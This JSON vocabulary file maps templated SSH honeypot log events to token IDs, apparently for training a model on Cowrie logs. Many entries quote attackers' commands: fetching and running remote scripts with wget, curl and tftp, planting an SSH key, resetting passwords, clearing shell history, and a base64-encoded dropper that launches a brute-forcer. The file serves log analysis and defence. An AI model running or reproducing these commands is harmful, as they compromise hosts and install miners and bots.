{
  "[PAD]": 0,
  "[UNK]": 1,
  "[MASK]": 2,
  "[CLS]": 3,
  "[SEP]": 4,
  "Closing TTY Log <*> after <*> seconds": 5,
  "Connection lost after <*> seconds": 6,
  "New connection IP <*> ( IP <*> [session SESSION ]": 7,
  "Remote SSH version SSH-X.X- SSH_VERSION": 8,
  "SSH client hassh fingerprint <*>": 9,
  "login attempt <*> USER <*> <*>": 10,
  "CMD <*>": 11,
  "login attempt <*> <*>": 12,
  "CMD uname <*>": 13,
  "CMD ls -lh $(which ls)": 14,
  "CMD which ls": 15,
  "CMD free -m grep Mem awk '{print $2 $3 $4 $5 $6 $7}'": 16,
  "CMD crontab -l": 17,
  "CMD cat /proc/cpuinfo grep model grep name wc -l": 18,
  "CMD cat /proc/cpuinfo grep name head -n 1 awk '{print $4 $5 $6 $7 $8 $9 }'": 19,
  "CMD lscpu grep Model": 20,
  "CMD cat /proc/cpuinfo grep name wc -l": 21,
  "Saved redir contents with SHA-256 <*> to <*>": 22,
  "CMD cd ~ rm -rf .ssh mkdir .ssh echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw mdrfckr\" .ssh/authorized_keys chmod -R go ~/.ssh cd ~": 23,
  "CMD echo \" USER <*> chpasswd bash": 24,
  "CMD echo <*> <*>": 25,
  "Command not found Enter new UNIX password": 26,
  "CMD Enter new UNIX password": 27,
  "CMD echo -e <*> passwd bash": 28,
  "login attempt <*> USER <*> USER <*> failed": 29,
  "CMD yum install wget -y apt install wget -y dnf install wget pacman -S wget cd /tmp wget http // IP /x86.sh curl -O http // IP /x86.sh chmod 777 x86.sh sh x86.sh microsoft": 30,
  "direct-tcp connection request to <*> <*> from IP <*>": 31,
  "discarded direct-tcp forward request <*> to IP 80 with data b'GET / HTTP/1.0\\r\\nHost <*>": 32,
  "direct-tcp connection request to <*> <*> <*> <*> <*> 80 from IP <*>": 33,
  "discarded direct-tcp forward request <*> to <*> <*> <*> <*> <*> 80 with data b'GET / HTTP/1.0\\r\\nHost <*>": 34,
  "login attempt [ <*> / <*> ] <*>": 35,
  "login attempt [ USER <*> <*> failed": 36,
  "Attempt to download file(s) from URL (http // IP <*> failed": 37,
  "nan": 38,
  "direct-tcp connection request to 2001 4998 24 120d 1 <*> 80 from IP <*>": 39,
  "discarded direct-tcp forward request <*> to 2001 4998 24 120d 1 <*> 80 with data b'GET / HTTP/1.0\\r\\nHost <*>": 40,
  "CMD yum install wget -y apt install wget -y cd /tmp wget http // IP /ssh.sh curl -O http // IP /ssh.sh chmod 777 ssh.sh sh ssh.sh tftp IP -c get ssh1.sh chmod 777 ssh1.sh sh ssh1.sh tftp -r ssh2.sh -g IP chmod 777 ssh2.sh sh ssh2.sh rm -rf ssh.sh ssh1.sh ssh2.sh": 41,
  "CMD cd /tmp wget http // IP /ok.sh curl -o ok.sh http // IP /ok.sh chmod 777 ok.sh ./ok.sh rm -rf ok.sh history -c": 42,
  "CMD echo \" USER <*> <*>": 43,
  "CMD cat <*>": 44,
  "Command not found lspci grep -i --color vga\\ 3d\\ 2d": 45,
  "CMD uname -a lspci grep -i --color 'vga\\ 3d\\ 2d' curl -s -L http // IP 8088/iposzz/dred -o /tmp/dred perl /tmp/dred": 46,
  "CMD rm -rf <*>": 47,
  "Remote SSH version <*> <*> <*>": 48,
  "CMD echo -e \" USER <*> passwd bash": 49,
  "CMD uname -s -v -n -r -m": 50,
  "SFTP Uploaded file <*> to <*>": 51,
  "direct-tcp connection request to 2a02 6b8 a a 80 from IP <*>": 52,
  "discarded direct-tcp forward request 5 to 2a02 6b8 a a 80 with data b'GET / HTTP/1.0\\r\\nHost yandex.ru\\r\\n\\r\\n'": 53,
  "CMD cd /tmp wget IP /ok.sh sh ok.sh rm -rf ok.sh curl -O IP /ok.sh sh ok.sh rm -rf ok.sh history -c": 54,
  "CMD cat /var/tmp/.var03522123 head -n 1": 55,
  "CMD wget IP /xmr.sh -O xmr.sh bash xmr.sh": 56,
  "login attempt [ USER <*> <*> <*> <*>": 57,
  "CMD (uname -smr /bin/uname -smr /usr/bin/uname -smr)": 58,
  "login attempt [ USER <*> <*> <*> <*> <*>": 59,
  "CMD wget -qO - http // IP <*> sh /dev/null 2 1": 60,
  "CMD rm -rf <*> wget -c http // IP <*> -P <*> sh <*>": 61,
  "CMD sleep 15s cd /var/tmp echo \"IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA \" base64 --decode bash": 62,
  "CMD cat /proc/cpuinfo grep name wc -l head -c 30": 63,
  "Terminal Size <*> <*>": 64,
  "CMD echo <*> <*> <*>": 65,
  "CMD /ip cloud print": 66,
  "Command not found /ip cloud print": 67,
  "CMD ps grep '[Mm]iner'": 68,
  "CMD ps -ef grep '[Mm]iner'": 69,
  "CMD ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*": 70,
  "Command not found <*>": 71,
  "request_env LANG <*>": 72,
  "CMD curl http // IP /.x/3sh sh": 73,
  "Remote SSH version <*>": 74,
  "login attempt [ USER <*> <*> <*> <*> <*> failed": 75,
  "CMD #!/bin/sh PATH $PATH /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin wget http // IP 88/112 curl -O http // IP 88/112 chmod +x 112 ./112 rm -rf 123.sh history -c": 76,
  "CMD ls -la /var/run/gcc.pid": 77,
  "CMD cd /var/run rm -rf tsh tftp -g IP -r tsh sh tsh": 78,
  "CMD cd /tmp chmod +x tzx3j2EX bash -c ./tzx3j2EX": 79,
  "Saved stdin contents with SHA-256 ca2b67960863aeeacc0c761a29ee7f00d4889a3c00bfc7f7b4c8daacd2dc9ef6 to var/lib/cowrie/downloads/ca2b67960863aeeacc0c761a29ee7f00d4889a3c00bfc7f7b4c8daacd2dc9ef6": 80,
  "CMD nproc curl -O IP /bot perl bot mv bot /": 81,
  "CMD uname -s -m": 82,
  "CMD scp -t /tmp/tzx3j2EX": 83,
  "Remote SSH version <*> <*> <*> <*> <*> \\xc00\u0000\\x9f\u0329\u0328\u032a\\xc0+\\xc0/\u0000\\x9e\\xc0$\\xc0(\u0000k\\xc0#\\xc0'\u0000g\\xc0": 84,
  "Remote SSH version \\xba\\xabd\\xa1EZC\\xdbM\\x87\\xee^\\xfd\\xbf\u00159 X\\xd4 \u0012\\x98\\xc4 \\xe0\u0013\\xcf\u0000\\xac\\xa09\u05d0#8~\\x8c\u079dReF\\xbf%1Q\\xe0\\x9d\u0006 g\\xbb\\x82\\x95\u0019\\xed\u0007\u0014\u0019ZP\\x80+\\x94e\\xc3\\xe6\\x85\u0006\\xa4\\x99\\x8b\u0019l\u0001\\xea\\x88Y\\x91\u0016\\x95\\xc4\\xc8\u000eH\u0002\u01d3g\\xc14FW\u0005 \\xfb\\xf3T\\xb8\\xfd\u02fb)\\xe3\\xce\\xdd\\xcd7\\x9e\\xefP\\x8c\\xa4[V\\xfd\\x98\\xc9l\\x82\\xf5\\xe4\\xc1d\\x87X\\xf7\\x9b\\xbf\\xe8q\u0012\\x99 \\xdb \\xf5\\x87\u05e8\\x97j \\xe3\ua9f4\\xb0\u0002\\xad\\x8dE\\x9b\\xaaB\\x80\u000e)\\xa9\\xe9\\xaf}\u0018\\x8e\\xb8 \\x99\u0004\ufa0c\\xe8\u0004\\xe2\\xd3\\xed)1\\x91\\xc1\\x8f\\x88\\x8c\\x81\\xf0\u06e5\\x88\\x95H\\x9bZ\\xab\u03bf\\xf4E%P*\\x88KFY6\\x9e\\xe7 j\u050a\\xa8V\\x9a\\xaa\\xab\\xaf\\xc3 .\\xed[\u0004\\xc5e\u007f\b\\xbe\\x8ar\\xa7\\xb0\\x99F\\xf7\u0011\\xe5\u0596\\x8cIm+w \\xfduU\u0014\u000f!x\\xac\\xe8MPy\\xc3\u0019!2\\xa0\\xed\\xc0}!Rw\u0014\\x8e\u001b\\xc4\u182f+\\xadKk\\xc5\\xe0\\s\\x9c\\xbd\\xcb": 85,
  "Remote SSH version \u0016\u0003\u0001\u0001 \u0001\u0000\u0001 \u0003\u0003\\xaf H\\xb3\\xf7\\xe0 \u001b\u07bd\\xab]\\xcd \u0011 \u0011\\xa6\u0006\\xdc\\xe8uu \\xbb\u0014\u0007\\xa6p\\xb5\u001a\\xa8 /\u0003\\x85\\xf8\u0006\\xa9u \\xc9/\\7\\xb6\\x92\\xcf-@\\xd3Tq9\\x94 \\xaf\u0015q\b? 2 \u0000 \u0013\u0002\u0013\u0003\u0013\u0001\\xc0 \\xc00\u0000\\x9f\u0329\u0328\u032a\\xc0+\\xc0/\u0000\\x9e\\xc0$\\xc0(\u0000k\\xc0#\\xc0'\u0000g\\xc0": 86,
  "Remote SSH version \u0016\u0003\u0001\u0000c\u0001\u0000\u0000_\u0003\u0002\\x91\u0002\\xef\\xce \u03e2 \\xee\\xf3\\x9c\u0015 \\xc2\\xc8U\\x84\u0011\\xe4\u0012\u047d\u046c\\xe5\\xe2\\x9c\\xe1P\b\\xec\"\u0000\u0000\u0012\\xc0": 87,
  "CMD free -m": 88,
  "CMD wget http // IP /d -O- sh": 89,
  "CMD unset HISTFILE unset HISTSIZE": 90,
  "Remote SSH version \u0016\u0003\u0001\u0000c\u0001\u0000\u0000_\u0003\u0001 `\u0011\\xe9\u0019VG\\x92\\x99 \\x8c\\xfd \u0011\\xcb\\xfe\\x96\\xb6*\\xa8\\xef.\\xe3 \\xb4\\xf6\\x81z9\\xb7\\xb9\u0000\u0000\u0012\\xc0": 91,
  "Remote SSH version \u0016\u0003\u0001\u0000c\u0001\u0000\u0000_\u0003\u0002il \\x85\\xf4\u0678\\xb1}\\x80\\xf2\\x82U\\xb2\\xdcS\\xecv \\xe6p\\xf7\\xc1#\u007f\\xc6 ^B \\xbaF\u0000\u0000\u0012\\xc0": 92,
  "Remote SSH version": 93,
  "discarded direct-tcp forward request 0 to IP 80 with data b'GET / HTTP/1.1\\r\\nHost google.com\\r\\nUser-Agent curl/7.64.0\\r\\nAccept */*\\r\\n\\r\\n'": 94,
  "Remote SSH version \u0016\u0003\u0001\u0001 <*> <*> <*> <*> <*> <*>": 95,
  "Remote SSH version \u0016\u0003\u0001\u0001 \u0001\u0000\u0001 \u0003\u0003\\xe2\u04d1\\xc0M \\xd29\\xf01%v f\\xc4\u3b40\\xfc\\x82*\\xf9h\\xea#\\xa5n\\xe8\\x96\u0019sg \u02e1 \\xa8\\xa3\\xf8\\x9cE \\xe4l+ \\v6T\\xf5\\xc8\\xf2\\x9c\\xa2 \\xe7\u000f~{h\\xa0\u00175\u0000 \u0013\u0002\u0013\u0003\u0013\u0001\\xc0 \\xc00\u0000\\x9f\u0329\u0328\u032a\\xc0+\\xc0/\u0000\\x9e\\xc0$\\xc0(\u0000k\\xc0#\\xc0'\u0000g\\xc0": 96
}